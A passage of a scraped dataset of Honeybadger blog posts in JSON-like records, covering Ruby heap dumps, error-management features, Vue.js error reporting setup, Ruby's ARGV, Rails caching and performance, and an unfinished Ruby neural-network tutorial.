ObjectSpace.dump_all(output: io); io.close}' Be warned though, heap dumps can be very big – on the order of a few hundred megabytes for a rails process. Here's a very small sample: [ { \"type\" : \"ROOT\" , \"root\" : \"vm\" , \"references\" : [ \"0x7fb7d38bc3f0\" , \"0x7fb7d38b79b8\" , \"0x7fb7d38dff80\" , \"0x7fb7d38bff50\" , \"0x7fb7d38bff00\" , \"0x7fb7d38b4bf0\" , \"0x7fb7d38bfe88\" , \"0x7fb7d38bfe60\" , \"0x7fb7d38ddc80\" , \"0x7fb7d38dffa8\" , \"0x7fb7d382fbd0\" , \"0x7fb7d382fbf8\" ] }, { \"type\" : \"ROOT\" , \"root\" : \"machine_context\" , \"references\" : [ \"0x7fb7d382fbf8\" , \"0x7fb7d382fbf8\" , \"0x7fb7d3827d40\" , \"0x7fb7d3827a70\" , \"0x7fb7d38becb8\" , \"0x7fb7d38bed08\" , \"0x7fb7d38ddc80\" , \"0x7fb7d3827e58\" , \"0x7fb7d3827e58\" , \"0x7fb7d38becb8\" , \"0x7fb7d38becb8\" , \"0x7fb7d38bc328\" , \"0x7fb7d38bc378\" , \"0x7fb7d38ddc80\" , \"0x7fb7d3835008\" , \"0x7fb7d3835008\" , \"0x7fb7d3835008\" , \"0x7fb7d3835008\" , \"0x7fb7d3835008\" ] }, { \"type\" : \"ROOT\" , \"root\" : \"global_list\" , \"references\" : [ \"0x7fb7d38dff58\" ] }, { \"type\" : \"ROOT\" , \"root\" : \"global_tbl\" , \"references\" : [ \"0x7fb7d38c6dc8\" , \"0x7fb7d38c6dc8\" , \"0x7fb7d38c65f8\" , \"0x7fb7d38c6580\" , \"0x7fb7d38c6508\" , \"0x7fb7d38c6580\" , \"0x7fb7d38c6288\" , \"0x7fb7d38c6288\" , \"0x7fb7d38c6288\" , \"0x7fb7d38c6288\" , \"0x7fb7d38c6288\" , \"0x7fb7d38bc418\" , \"0x7fb7d38bc418\" , \"0x7fb7d38bc418\" , \"0x7fb7d3835328\" , \"0x7fb7d3835328\" ] }, { \"address\" : \"0x7fb7d300c5e8\" , \"type\" : \"STRING\" , \"class\" : \"0x7fb7d38dcee8\" , \"frozen\" : true , \"embedded\" : true , \"fstring\" : true , \"bytesize\" : 10 , \"value\" : \"@exit_code\" , \"encoding\" : \"US-ASCII\" , \"memsize\" : 40 , \"flags\" : { \"wb_protected\" : true , \"old\" : true , \"long_lived\" : true , \"marked\" : true } }, { \"address\" : \"0x7fb7d300c7a0\" , \"type\" : \"STRING\" , \"class\" : \"0x7fb7d38dcee8\" , \"frozen\" : true , \"embedded\" : true , \"fstring\" : true , \"bytesize\" : 9 , \"value\" : \"exit_code\" , \"encoding\" : \"US-ASCII\" , \"memsize\" : 40 , \"flags\" : { \"wb_protected\" : true , \"old\" : true , \"long_lived\" : true , \"marked\" : true } }, { \"address\" : \"0x7fb7d300c908\" , \"type\" : \"STRING\" , \"class\" : \"0x7fb7d38dcee8\" , \"frozen\" : true , \"embedded\" : true , \"fstring\" : true , \"bytesize\" : 19 , \"value\" : \"SystemExitException\" , \"encoding\" : \"US-ASCII\" , \"memsize\" : 40 , \"flags\" : { \"wb_protected\" : true , \"old\" : true , \"long_lived\" : true , \"marked\" : true } }, { \"address\" : \"0x7fb7d300cb60\" , \"type\" : \"STRING\" , \"class\" : \"0x7fb7d38dcee8\" , \"frozen\" : true , \"embedded\" : true , \"fstring\" : true , \"bytesize\" : 17 , \"value\" : \"VerificationError\" , \"encoding\" : \"US-ASCII\" , \"memsize\" : 40 , \"flags\" : { \"wb_protected\" : true , \"old\" : true , \"long_lived\" : true , \"marked\" : true } }, { \"address\" : \"0x7fb7d300cd90\" , \"type\" : \"STRING\" , \"class\" : \"0x7fb7d38dcee8\" , \"frozen\" : true , \"embedded\" : true , \"fstring\" : true , \"bytesize\" : 19 , \"value\" : \"RubyVersionMismatch\" , \"encoding\" : \"US-ASCII\" , \"memsize\" : 40 , \"flags\" : { \"wb_protected\" : true , \"old\" : true , \"long_lived\" : true , \"marked\" : true } }, { \"address\" : \"0x7fb7d300cfe8\" , \"type\" : \"STRING\" , \"class\" : \"0x7fb7d38dcee8\" , \"frozen\" : true , \"embedded\" : true , \"fstring\" : true , \"bytesize\" : 21 , \"value\" : \"RemoteSourceException\" , \"encoding\" : \"US-ASCII\" , \"memsize\" : 40 , \"flags\" : { \"wb_protected\" : true , \"old\" : true , \"long_lived\" : true , \"marked\" : true } }, { \"address\" : \"0x7fb7d300d1f0\" , \"type\" : \"STRING\" , \"class\" : \"0x7fb7d38dcee8\" , \"frozen\" : true , \"fstring\" : true , \"bytesize\" : 25 , \"value\" : \"RemoteInstallationSkipped\" , \"encoding\" : \"US-ASCII\" , \"memsize\" : 66 , \"flags\" : { \"wb_protected\" : true , \"old\" : true , \"long_lived\" : true , \"marked\" : true } }, { \"address\" : \"0x7fb7d300d3a8\" , \"type\" : \"STRING\" , \"class\" : \"0x7fb7d38dcee8\" , \"frozen\" : true , \"fstring\" : true , \"bytesize\" : 27 , \"value\" : \"RemoteInstallationCancelled\" , \"encoding\" : \"US-ASCII\" , \"memsize\" : 68 , \"flags\" : { \"wb_protected\" : true , \"old\" : true , \"long_lived\" : true , \"marked\" : true } }, { \"address\" : \"0x7fb7d300d560\" , \"type\" : \"STRING\" , \"class\" : \"0x7fb7d38dcee8\" , \"frozen\" : true , \"embedded\" : true , \"fstring\" : true , \"bytesize\" : 11 , \"value\" : \"RemoteError\" , \"encoding\" : \"US-ASCII\" , \"memsize\" : 40 , \"flags\" : { \"wb_protected\" : true , \"old\" : true , \"long_lived\" : true , \"marked\" : true } }, { \"address\" : \"0x7fb7d300d830\" , \"type\" : \"STRING\" , \"class\" : \"0x7fb7d38dcee8\" , \"frozen\" : true , \"fstring\" : true , \"bytesize\" : 26 , \"value\" : \"OperationNotSupportedError\" , \"encoding\" : \"US-ASCII\" , \"memsize\" : 67 , \"flags\" : { \"wb_protected\" : true , \"old\" : true , \"long_lived\" : true , \"marked\" : true } }, { \"address\" : \"0x7fb7d300dbc8\" , \"type\" : \"STRING\" , \"class\" : \"0x7fb7d38dcee8\" , \"frozen\" : true , \"embedded\" : true , \"fstring\" : true , \"bytesize\" : 12 , \"value\" : \"InstallError\" , \"encoding\" : \"US-ASCII\" , \"memsize\" : 40 , \"flags\" : { \"wb_protected\" : true , \"old\" : true , \"long_lived\" : true , \"marked\" : true } }, { \"address\" : \"0x7fb7d300e898\" , \"type\" : \"STRING\" , \"class\" : \"0x7fb7d38dcee8\" , \"frozen\" : true , \"embedded\" : true , \"fstring\" : true , \"bytesize\" : 9 , \"value\" : \"requester\" , \"encoding\" : \"US-ASCII\" , \"memsize\" : 40 , \"flags\" : { \"wb_protected\" : true , \"old\" : true , \"long_lived\" : true , \"marked\" : true } }, { \"address\" : \"0x7fb7d300eaa0\" , \"type\" : \"STRING\" , \"class\" : \"0x7fb7d38dcee8\" , \"frozen\" : true , \"embedded\" : true , \"fstring\" : true , \"bytesize\" : 13 , \"value\" : \"build_message\" , \"encoding\" : \"US-ASCII\" , \"memsize\" : 40 , \"flags\" : { \"wb_protected\" : true , \"old\" : true , \"long_lived\" : true , \"marked\" : true } }, { \"address\" : \"0x7fb7d300ec30\" , \"type\" : \"STRING\" , \"class\" : \"0x7fb7d38dcee8\" , \"frozen\" : true , \"embedded\" : true , \"fstring\" : true , \"bytesize\" : 8 , \"value\" : \"@request\" , \"encoding\" : \"US-ASCII\" , \"memsize\" : 40 , \"flags\" : { \"wb_protected\" : true , \"old\" : true , \"long_lived\" : true , \"marked\" : true } }, { \"address\" : \"0x7fb7d300ede8\" , \"type\" : \"STRING\" , \"class\" : \"0x7fb7d38dcee8\" , \"frozen\" : true , \"embedded\" : true , \"fstring\" : true , \"bytesize\" : 7 , \"value\" : \"request\" , \"encoding\" : \"US-ASCII\" , \"memsize\" : 40 , \"flags\" : { \"wb_protected\" : true , \"old\" : true , \"long_lived\" : true , \"marked\" : true } }, { \"address\" : \"0x7fb7d300efa0\" , \"type\" : \"STRING\" , \"class\" : \"0x7fb7d38dcee8\" , \"frozen\" : true , \"fstring\" : true , \"bytesize\" : 27 , \"value\" : \"ImpossibleDependenciesError\" , \"encoding\" : \"US-ASCII\" , \"memsize\" : 68 , \"flags\" : { \"wb_protected\" : true , \"old\" : true , \"long_lived\" : true , \"marked\" : true } } ]", "date": "2015-11-17"},
{"website": "Honey-Badger", "title": "Honeybadger Actions", "author": ["Kevin Webster"], "link": "https://www.honeybadger.io/blog/honeybadger-actions/", "abstract": "We understand error management can be painful. Incidents might leave you reeling with pages of faults to triage and either deal with or move to the wayside. How about that one persistent error that keeps alerting you, even though it's not affecting customers? We've added a feature we call Actions to assist with error management, and it comes in two flavors: Project Actions Wouldn't it be nice to automatically assign errors to yourself or another team member? How about adding tags to specific error classes for better organization? Project Actions give you the ability to do these things by allowing a custom set of defaults for your incoming errors. Here at Honeybadger, we all wear many hats, but we also have our areas of expertise. For example, Ben takes care of most of the code and support tasks around billing. I'll show you how we utilize Project Actions to automatically assign billing related errors to Ben. Look, a new Actions section in the Project settings: Let's create a Project Action and use filtering to apply an action only when an error comes from a Stripe callback controller: Note: We can only filter by basic fault data (message, error class, controller name, etc.), which means you can't filter on properties like request params or context. This is because those properties come from the notice (the individual error event) and that data can vary per error. Now when an error is thrown from a Stripe controller, it will automatically be assigned to Ben. Yay! Look, you can see in the history that we already had a new error assigned: There are other actions you can invoke: add tags, make faults public or ignore faults for a varying period of time (or count). Batch Actions Batch Actions are similar to Project Actions, except they can be applied ad-hoc to any set of errors. We've added a new Actions dropdown to the fault search page. You can apply actions to all returned faults, or you can select specific faults by selecting checkboxes next to each fault. It looks like Ben doesn't want to be in charge of billing after all. Let's assign all those Stripe errors to myself then: Easy. We hope that Actions will help you organize your collection of faults. Give it a try and let us know how it goes!", "date": "2020-06-29"},
{"website": "Honey-Badger", "title": "Comments are a beautiful thing", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/comments-are-a-beautiful-thing/", "abstract": "Github flavored markdown lets you add structure, images, links and code to your comments. By the way, did you know that you can comment on an error just by replying to it's email notice? Pretty cool, huh? Here's the code we used to create the example above: `# Comments now have github flavored markdown\n\n## Subheading\n\nLorem ipsum dolor sit amet, consectetur adipiscing elit. Vestibulum eu lacus nibh. Duis ac arcu velit, vel consectetur ante. Sed vestibulum pretium nisi scelerisque semper. Duis est lectus, porttitor nec elementum eu, interdum at enim. Maecenas tristique congue fermentum. Nulla in massa est, vel semper dolor. Phasellus vel risus quis justo fermentum aliquam nec sed mauris. Sed at enim lacus, ut commodo purus. Aenean ultricies facilisis nibh et luctus. Nam a ante quis risus elementum dapibus. Mauris in tortor elit. Integer vel sapien turpis, sed malesuada sapien. Etiam erat turpis, suscipit ut consequat non, pellentesque at sapien. Ut ut sem sed leo vulputate fringilla. Praesent viverra diam a leo ultrices ut adipiscing tortor aliquet.\n\n```ruby\nclass MyClass\n  def to_s\n    \"Hey, it has syntax highlighting\"\n  end\nend ``", "date": "2013-04-03"},
{"website": "Honey-Badger", "title": "Track Vue.js Errors with Honeybadger", "author": ["Josh Wood"], "link": "https://www.honeybadger.io/blog/track-vue-js-errors-with-honeybadger/", "abstract": "Vue.js. It's so hot right now. Hot like the sub-Saharan desert: a perfect climate for Honeybadgers. Good news, 'badgers! We just shipped an official Vue.js integration for Honeybadger . When your Vue apps are on fire, Honeybadger alerts you of exceptions in real-time, helping to identify the root cause so that you can fix them—fast. Set up Vue.js Error Reporting Configuring your Vue app to report exceptions to Honeybadger is easy. Thanks to Vue's built-in error handler, setup is a simple two-step process. Install the Honeybadger Vue package: # npm npm add @honeybadger-io/vue --save # yarn yarn add @honeybadger-io/vue Configure Honeybadger: import HoneybadgerVue from ' @honeybadger-io/vue ' const config = { apiKey : ' project api key ' , environment : ' prod ' , revision : ' master ' } Vue . use ( HoneybadgerVue , config ) All unhandled exceptions will now be reported to Honeybadger. See our official Vue Integration Guide for more detailed instructions and documentation. Don't Forget Your Source Map Getting good stack traces for front-end errors can be tricky. A good stack trace points to the line number in the original source file where the error occurred in your Vue project. Unfortunately, modern build processes have multiple stages where your original source code gets chopped up, optimized, and compressed to squeeze the best performance from it. That's great for performance, but bad for debugging (read: error reporting). Source maps are the answer. If you're using Webpack to build your production JavaScript (this should be most of you), then you can automatically upload source maps to Honeybadger using our Webpack plugin . Install the Honeybadger Webpack package: # npm npm add @honeybadger-io/webpack --save-dev # yarn yarn add @honeybadger-io/webpack Add our plugin to your Webpack config: const HoneybadgerSourceMapPlugin = require ( ' @honeybadger-io/webpack ' ) // The base URL where you host your production assets const ASSETS_URL = ' https://cdn.example.com/assets ' // Insert the HoneybadgerSourceMapPlugin in your existing // plugins array: const webpackConfig = { plugins : [ new HoneybadgerSourceMapPlugin ({ apiKey : ' project api key ' , assetsUrl : ASSETS_URL , revision : ' master ' })] } Every time you build your Webpack project, the source map will be uploaded to Honeybadger. Check out the Honeybadger Webpack Plugin on GitHub for additional documentation. Versioning Your Project In the previous examples, we set the revision: 'master' option in both the Vue and Webpack config. In Honeybadger, the revision is a unique version for your project; it's what we use to match up the correct source map with the correct error. While \"master\" will technically work for your first build, you'll want to come up with a better way to version your project in Honeybadger—every build must be unique. We leave versioning up to you, but we prefer Git commit SHAs, since they are always unique for the current build. According to Stack Overflow , here's a concise way to get the current Git SHA in Node.js: const REVISION = require ( ' child_process ' ) . execSync ( ' git rev-parse HEAD ' ) . toString (). trim () // In your Vue/Webpack config: { // ... revision : REVISION } Wrapping Up We're stoked to launch official Vue.js support for Honeybadger, and this is only the beginning! It's our mission to make Honeybadger the best way to monitor your production Vue applications. To unlock the full power of Honeybadger and Vue.js, use it to monitor your back-end (Laravel, Rails, Express, etc.), background tasks and cron jobs, and external uptime. Be the Honeybadger on Your Team — Start Your 15-day Free Trial", "date": "2018-11-29"},
{"website": "Honey-Badger", "title": "How does ARGV get set in Ruby?", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/what-does-argv-mean-in-ruby/", "abstract": "You may know that Ruby sticks command-line arguments into a global array called ARGV. But why the heck is it called ARGV? It's an interesting history lesson that highlights Ruby's origins in C. Argument Vector ARGV stands for argument vector. And \"vector\" in this strange old-timey usage means \"a one-dimensional array.\" In C, every program has a main() function. It typically looks something like this: int main ( int argc , char * argv []) { ... your code here } As you probably noticed, the main function has two arguments.  These are, respectively, a count and an array of command-line arguments. When you tell bash to run your program, it does a system call which causes the OS to call your program's main function and to pass in certain argc and argv values. Ruby The Ruby interpreter  — MRI at least – is just a C program. Here is Ruby's main function: int main ( int argc , char ** argv ) { #ifdef RUBY_DEBUG_ENV ruby_set_debug_option ( getenv ( \"RUBY_DEBUG\" )); #endif\n#ifdef HAVE_LOCALE_H setlocale ( LC_CTYPE , \"\" ); #endif ruby_sysinit ( & argc , & argv ); { RUBY_INIT_STACK ; ruby_init (); return ruby_run_node ( ruby_options ( argc , argv )); } } As you can see, it passes argc and argv to a function called ruby_options , which in turn calls ruby_process_options , which calls process_options . That handles all of the ruby interpreter options and eventually calls ruby_set_argv , which sets the ARGV you see in your ruby code. void ruby_set_argv ( int argc , char ** argv ) { int i ; VALUE av = rb_argv ; #if defined(USE_DLN_A_OUT) if ( origarg . argv ) dln_argv0 = origarg . argv [ 0 ]; else dln_argv0 = argv [ 0 ]; #endif rb_ary_clear ( av ); for ( i = 0 ; i < argc ; i ++ ) { VALUE arg = external_str_new_cstr ( argv [ i ]); OBJ_FREEZE ( arg ); rb_ary_push ( av , arg ); } } Pretty neat. I'm still really new at diving into MRI codebase, but it's kind of fun to jump in and see exactly how things work.", "date": "2015-12-21"},
{"website": "Honey-Badger", "title": "Sunsetting Performance Metrics", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/sunsetting-performance-metrics/", "abstract": "Ok, time to rip off the band-aid… On October 10 we’re going to be removing the performance metrics tab from Honeybadger. Nothing will change for users on our Micro and Small plans. But Medium and Large customers will lose a couple of features: Slow request reports Charts of time per request and requests per minute. Why on earth would we do such a thing? Here’s the answer, in a nutshell: Only 0.5% of our users frequently visit our performance metrics pages. Around 30% of our compute capacity and ops-engineer hours are spent servicing metrics. We want to take these resources and re-focus them on things that more users actually care about. Things like better search, faster load times and a more polished user experience. …in fact, you should see some big UX improvements in the coming weeks. If you’re one of the select few who loved our metrics, please accept my personal apology. If you’d like to have a word with me, my email is starr@honeybadger.io. What exactly is changing? We're only getting rid of the stuff shown here . Everything else is staying the same. We don't have plans to drop any other major features. :) You don't need to make any changes to apps that currently use Honeybadger performance metrics. Existing client libraries will continue to work.", "date": "2016-09-23"},
{"website": "Honey-Badger", "title": "Rails Rumble: Our Staff Picks", "author": ["Starr Horne"], "link": "https://www.honeybadger.io/blog/rails-rumble-our-staff-picks/", "abstract": "Another rails rumble is over, and now we get to see the apps! There are almost too many entries this year to look at them all. But never fear, the intreped honeybadger team is here to help you sort through them with our much-awaited staff picks! Audify Brought to you by “double trouble,” Audify allows users to convert YouTube videos to mp3 format, for use on mobile devices. Now you can listen to Felix Baumgartner's space jump without loading the video every time you want to remember the awesomeness of those moments, you can look up the next episode of University of Andy even if your eyes must be otherwise occupied, and jamming out with Antoine Dodson is easier than ever! CinderellaApp Have you ever lost your phone or your camera at party, sports event, or show? Now there is a centralized hub for posting lost and found items. “Platform 45” has created one of the most useful apps imaginable with CinderellaApp. Event attendees have the opportunity to post found and lost items via geolocation services, and can thus meet up with people who have their stuff or whose stuff they’ve found. Cinderella would have found her prince in no time with this app! Now everyone can have a lost and found bin in their pocket, all the time. Dear Friend Handwritten letters are a thing of the past, right? Not if you utilize Dear Friend! Email messages are bland and impersonal at best, no matter how well written they are. With this app, receiving a handwritten letter can be a highlight of someone's day, again. Not only does the app make possible true personalization of email messages, it puts users in contact with actual people who benefit from the opportunity to make someone else's day a little brighter, thus supporting individuals and local economies. Watch the video here http://vimeo.com/51390650 Chores Corp. If you've ever lived with roommates, or had children, you know how difficult it can be to keep up with housework, let alone make sure no one feels overburdened with doing more than their fair share of it. “GreenRuby” has created a great app for making sure you and your housemates keep up with your chores regularly. This is so much better than a star chart on the refrigerator, and it can be updated, anywhere, anytime! Goodmix Remember making mixtapes? Even if you don't, you can now create your own personalized music compilations with Goodmix. You basically have access to any and every song you can think of to combine on your own music lists. Make custom cover art for your mixtape, and send it along to those who appreciate your excellent taste. You know that guy who is the only one who loves Pat Benetar and Bing Crosby while doing dishes, just like you? Now he can rememeber you forever, with his very own Bingetar tape!", "date": "2012-10-16"},
{"website": "Honey-Badger", "title": "Rails Performance: When is Caching the Right Choice?", "author": ["Jonathan Miles"], "link": "https://www.honeybadger.io/blog/rails-caching-alternatives/", "abstract": "In programming terms, caching refers to storing a value (or values) for quick retrieval in the future. Typically, you'd do this with values that are slow to compute for some reason; for example, they require hitting an external API to retrieve, or they involve a lot of number-crunching to generate. Cached values are often stored on a separate server, like memcached or Redis. They can be stored on a disk or in RAM. In code, we often 'cache' data inside of variables to avoid calling expensive functions multiple times. data = some_calculation () a ( data ) b ( data ) The trade-off for all the speed you gain is that you're using old data. What if the cached data become 'stale' and are no longer accurate? You'll have to clear the cache to 'invalidate' it. The Argument Against Caching As the old saying goes, there are only 2 hard problems in computer science:\n1. Naming things\n2. Cache invalidation\n3. Off-by-one errors Why is cache invalidation so difficult? A cached value, by its very nature, 'hides' a real value. Any time the 'real' value changes, you (yes, you, the programmer) have to remember to 'invalidate' the cache so that it will get updated. Suppose you're adding a 'word count' widget to a text editor. You need to update the word count as the user types. The simplest approach is to re-count the words on every keystroke, but this is too slow. There is another approach: Count the words when loading the file. Save this word-count to a variable (or 'cache it'). Display the contents of the variable to screen. This implementation is much faster, but the cached 'word count' doesn't change as we type. To do so, we need to 'invalidate' the cache whenever we expect the word count to change. Now, as keystrokes come are made, you will detect words (i.e., spaces) and increment the word counter. Of course, you'll also decrement it when the user is deleting words. Easy. Done. Next ticket. ...But wait, did you remember to update the word count when the user cuts text to the clipboard? What about when they paste text? What about when the spell-checker splits a typo into two words? The problem here isn't updating the value, which is fairly trivial. The problem is that you have to remember to update it in every single place . Missing just one of these updates causes cache invalidation problems, meaning you'll be displaying a stale value to the user. With this in mind, you can see that adding in caching brings in technical complexity and potential sources of bugs. Of course, these problems can be solved, but it is something to keep in mind before jumping to caching as the solution. Speed Without Caching If we take caching off the table, speeding up our application is all about identifying and fixing performance bottlenecks - systems that are slower than they could be. We can group them into three overall categories: Database queries (either too many or too slow) View rendering Application code (e.g., performing heavy calculations) When working on performance, there are two techniques you need to know about to make headway: profiling and benchmarking. Profiling Profiling is how you know where the problems are in your app: Is this page slow because rendering the template is slow? Or, is it slow because it's hitting the database a million times? For Ruby on Rails, I'd recommend rack-mini-profiler , which adds a nice little widget to the edge of your app. It gives you a good overview of what it took to render the page you're looking at, such as how many database queries were fired off, how long they took, and how many partials were rendered. For production (pro-tip: rack-mini-profiler works well in production; just make sure it only appears for certain users, such as admins or developers), there are online services, including Skylight, New Relic, and Scout, that monitor page performance. The typically cited target <= 100ms is great for page rendering, as anything less than this is difficult for a user to detect anyway in real-world internet usage. Your target will vary depending on many factors. At one point, when working on a legacy application with terrible performance, I made <= 1 second the target, which is not great but a heck of a lot better than when I started. Benchmarking Once we figure out where the problem is, then we can use benchmarks to see what (if any) effect our optimization had on performance. Personally, I like using the benchmark-ips gem for this kind of work, as it gives you an easy human-readable way to see the differences your code has made. As a trivial example, here's a comparison of string concatenation vs string interpolation: require 'benchmark/ips' @a = \"abc\" @b = \"def\" Benchmark . ips do | x | x . report ( \"Concatenation\" ) { @a + @b } x . report ( \"Interpolation\" ) { \" #{ @a }#{ @b } \" } x . compare! end and the results: Warming up --------------------------------------\n       Concatenation   316.022k i/100ms\n       Interpolation   282.422k i/100ms\nCalculating -------------------------------------\n       Concatenation     10.353M (± 7.4%) i/s -     51.512M in   5.016567s\n       Interpolation      6.615M (± 6.8%) i/s -     33.043M in   5.023636s\n\nComparison:\n       Concatenation: 10112435.3 i/s\n       Interpolation:  6721867.3 i/s - 1.50x  slower This gives us a nice human-readable result, and interpolation is 1.5 times slower than concatenation (at least for our small strings). For this reason, I'd also recommend copying the method you're trying to improve and giving it a new name. You can then run quick comparisons to see if you're improving its performance as you go. Fixing Performance Issues At this point, we know what parts of our app are slow. We have benchmarks in place to measure any improvement when it happens. Now, we just need to do the actual work of optimizing performance. The techniques you choose will depend on where your issues are: in the database, views, or application. Database Performance For database-related performance issues, there are a few things to look at. First, avoid the dreaded 'N+1 queries.' Situations like this often occur in rendering a collection in a view. For example, you have a user with 10 blog posts, and you want to display the user and all of his or her posts. A naive first-cut might be something like this: # Controller def show @user = User . find ( params [ :id ]) end # View\nName: <%= @user . name %> Posts: <%= @user . posts each do | post | %> <div> Title: <%= post . title %> </div> <% end %> The approach shown above will get the user (1 query) and then fire off a query for each individual post (N=10 queries), resulting in 11 total (or N+1). Fortunately, Rails provides a simple solution to this problem by adding .includes(:post) to your ActiveRecord query. So, in the above example, we just change the controller code to the following: def show @user = User . includes ( :post ). find ( params [ :id ]) end Now, we will be fetching the user and all of his or posts in one database query. Another thing to look for is where you can push calculations into the database, which is usually faster than performing the same operation in your application. A common form of this is aggregations like the following: total = Model . all . map ( & :somefield ). sum This is grabbing all the records from the database, but the actual summing of the values happens in Ruby.\nWe can speed this up by having the database perform the calculation for us like so: total = Model . sum ( :somefield ) Perhaps you need something more complicated, such as multiplying two columns: total = Model . sum ( 'columna * columnb' ) Common databases support basic arithmetic like this and also common aggregations like sum and average, so be on the lookout for map(...).sum calls in your codebase. View Performance Although I would say template-related performance woes lend themselves more to caching as a solution, there is still some low-hanging fruit that you may want to rule out first. For general page-load times, you can check that you are using minified sources for any Javascript or CSS libraries (on production servers at least). Also, watch out for large numbers of partials being included. If your _widget.html.erb template takes 1ms to process, but you have 100 widgets on the page, then that's 100ms gone already. One solution is to reconsider your UI. Having 100 widgets on the screen at once is usually not a great user experience, and you may want to look at using some form of pagination or, perhaps, an even more drastic UI/UX overhaul. Application Code Performance If your performance issue is in the application code itself (i.e., the manipulation of data) rather than the view or database layers, you have a couple of options. One is to see if at least some of the work could be pushed into the database either as queries, as described above, or as database views with, perhaps, something like the scenic gem ). Another option is to move the 'heavy lifting' into a background job, though this may require changes to your UI to handle the fact that the value is now going to be computed asynchronously. I Still Need Caching; Now What? Having made it through all this, maybe you've decided that yes, caching is the solution you need. So, what should you do? Stay tuned because this is the first in a series of articles covering different forms of caching available within Ruby on Rails.", "date": "2020-04-21"},
{"website": "Honey-Badger", "title": "Neural Networks in Ruby: A Not-So-Scary Introduction", "author": ["Julie Kent"], "link": "https://www.honeybadger.io/blog/ruby-neural-networks/", "abstract": "In this post, we will learn the basics of neural networks and how we can implement them utilizing Ruby! If you're intrigued by artificial intelligence and deep learning but are unsure how to get started, this post is for you! We'll walk through a simple example to highlight the key concepts. It's pretty unlikely that you'd ever use Ruby to write multiple-layer neural networks, but for simplicity and readability, it's a great way to understand what's going on. First, let's take a step back and look at how we got here. A still from the movie Ex Machnia. Photo credit Ex Machina was a movie released in 2014. If you look the title up on Google, it classifies the genre of the film as \"Drama/Fantasy.\" And, when I first watched the film, it did seem like science fiction. But, for much much longer? If you ask Ray Kurzweil, a well-known futurist who works at Google, 2029 could be the year artificial intelligence will pass a valid Turing test (which is  an experiment to see whether a human can distinguish between a machine/computer and another human.) He also predicts that singularity (when computers surpass human intelligence) will emerge by 2045. What makes Kurzweil so confident? The emergence of deep learning Put simply, deep learning is a subset of machine learning that utilizes neural networks to extract insights from large amounts of data. Real-world applications of deep learning include the following: \n- Self-driving cars\n- Cancer detection\n- Virtual assistants, such as Siri and Alexa \n- Predicting extreme weather events, such as earthquakes But, what is a \"neural network?\" Neural networks get their name from neurons, which are brain cells that process and transmit information through electrical and chemical signals. Fun fact: the human brain is made up of 80+ billion neurons! In computing, a neural network looks like this: An example neural network diagram. Photo credit As you can see, there are three parts: \n1) The input layer -- The initial data \n2) Hidden layer(s) -- A neural network can have 1 (or more) hidden layers. This is where all of the computation is done! \n3) Output layer -- The end result/prediction A quick history lesson Neural networks aren't new. In fact, the first trainable neural network (the Perceptron) was developed at Cornell University in the 1950s. However, there was a lot of pessimism surrounding the applicability of neural networks, mainly because the original model only consisted of one hidden layer. A book published in 1969 showed that utilizing Perceptron for fairly simple computations would be impractical. The resurgence of neural networks can be attributed to computer games, which now require extremely high powered graphics processing units (GPUs), whose architecture closely resembles that of a neural net. The difference is the number of hidden layers. Instead of one, neural networks trained today are using 10, 15, or even 50+ layers! Example time! To understand how this works, let's look at an example. You will need to install the ruby-fann gem. Open up your terminal and move to your working directory. Then, run the following: gem install ruby-fann Create a new Ruby file (I named mine neural-net.rb ). Next, we will utilize the \"Student Alcohol Consumption\" dataset from Kaggle. You can download it here . Open up the \"student-mat.csv\" file in Google Sheets (or your editor of choice.) Delete all of the columns except for these: \n- Dalc (Workday alcohol consumption where 1 is very low and 5 is very high) \n- Walc (Weekend alcohol consumption where 1 is very low and 5 is very high) \n- G3 (Final grade between 0 and 20) We need to change our final grade column to be binary -- either a 0 or 1 -- for the ruby-fann gem to work. For this example, we will assume that anything less than or equal to 10 is a \"0\" and greater than 10 is a \"1\". Depending on what program you're using, you should be able to write a formula in the cell to automatically change the value to either 1 or 0 based on the cell's value. In Google Sheets, it looks something like this: =IF(C3 >= 10, 1, 0) Save this data as a .CSV file (I named mine students.csv ) in the same directory as your Ruby file. Our neural network will have the following layers: \n- Input Layer: 2 nodes (workday alcohol consumption and weekend alcohol consumption)\n- Hidden Layer: 6 hidden nodes (this is somewhat arbitrary to start; you can modify this later as you test)\n- Output Layer: 1 node (either a 0 or 1) First, we will need to require the ruby-fann gem, as well as the built-in csv library. Add this to the first line in your Ruby program: require 'ruby-fann'\nrequire 'csv' Next, we need to load our data from our CSV file into arrays. # Create two empty arrays. One will hold our independent varaibles (x_data), and the other will hold our dependent variable (y_data). x_data = [] y_data = [] # Iterate through our CSV data and add elements to applicable arrays. # Note that if we don't add the .to_f and .to_i, our arrays would have strings, and the ruby-fann library would not be happy. CSV . foreach ( \"students.csv\" , headers: false ) do | row | x_data . push ([ row [ 0 ]. to_f , row [ 1 ]. to_f ]) y_data . push ( row [ 2 ]. to_i ) end Next, we need to divide our data into training and testing data. A 80/20 split is pretty common, where 20% of your data is used for testing and 80% for training. \"Training,\" here, means that the model will learn based on this data, and then we will use our \"testing\" data to see how well the model predicts outcomes. # Divide data into a training set and test set. testing_percentage = 20.0 # Take the number of total elements and multiply by the test percentage. testing_size = x_data . size * ( testing_percentage / 100 . to_f ) # Start at the beginning and end at the testing_size - 1 since arrays are 0-indexed. x_test_data = x_data [ 0 .. ( testing_size - 1 )] y_test_data = y_data [ 0 .. ( testing_size - 1 )] # Pick up where we left off until the end of the dataset. x_train_data = x_data [ testing_size .. x_data . size ] y_train_data = y_data [ testing_size .. y_data . size ] Cool! We have our data ready to go. Next comes the magic! # Set up the training data model.\ntrain = RubyFann::TrainData.new(:inputs=> x_train_data, :desired_outputs=>y_train_data) We use the RubyFann::TrainData object, and pass in our x_train_data, which is our workday and weekend alcohol consumption, and our y_train_data, which is 0 or 1 based on the final course grade. Now, let's setup our actual neural network model with the number of hidden neurons we discussed earlier. # Set up the model and train using training data. model = RubyFann :: Standard . new ( num_inputs: 2 , hidden_neurons: [ 6 ], num_outputs: 1 ); OK, time to train! model . train_on_data ( train , 1000 , 10 , 0.01 ) Here, we pass in the train variable we created earlier. The 1000 represents the number of max_epochs, the 10 represents the number of errors between reports, and the 0.1 is our desired mean-squared error. One epoch is when the entire dataset is passed through the neural network. Mean-squared error is what we are trying to minimize. You can read more about what this means here . Next, we want to know how well our model did by comparing what the model predicted for our test data with the actual results. We can accomplish this by utilizing this code: predicted = [] # Iterate over our 